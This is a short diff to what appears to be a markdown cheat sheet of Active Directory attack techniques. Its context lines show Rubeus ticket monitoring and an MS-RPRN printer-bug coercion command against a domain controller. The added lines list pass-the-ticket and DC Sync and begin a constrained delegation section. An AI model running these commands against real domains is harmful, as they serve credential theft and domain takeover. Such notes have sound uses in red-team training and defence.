@@ -54,4 +54,8 @@ Rubeus.exe monitor /interval:5 /nowrap
 MS-RPRN.exe \\dc.machine.local \\compromised.machine.local
 ```
 
-3.
+3. Pass The Ticket
+4. DC Sync
+
+## Constrained Delegation
+
